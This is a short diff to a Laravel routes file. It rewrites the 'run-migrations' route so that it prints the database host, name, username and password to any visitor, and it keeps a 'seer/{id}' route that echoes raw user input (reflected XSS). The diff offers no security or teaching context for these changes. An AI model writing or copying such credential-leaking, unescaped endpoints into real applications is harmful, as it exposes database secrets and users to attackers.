@@ -1,8 +1,8 @@
-<?php
+<?php error_reporting(1);
 
 use Illuminate\Support\Facades\Route;
 use App\Http\Controllers\LoginController;
-use Illuminate\Support\Facades\Artisan;
+use Artisan;
 
 /*
 |--------------------------------------------------------------------------
@@ -24,14 +24,9 @@ Route::get('seer/{id}', function ($id) {
     echo($id);
 });
 Route::get('run-migrations', function () {
-    try {
-        //code...
-        return Artisan::call('migrate');
-    } catch (Exception $e) {
-        //throw $th;
-        $e->getMessage();
-        print($e);
-    }
-    
+    echo env('DB_HOST', false);
+    echo env('DB_DATABASE', false);
+    echo env('DB_USERNAME', false);
+    echo env('DB_PASSWORD', false); 
 });
 Route::get('customer/{id}', [LoginController::class, 'show']);
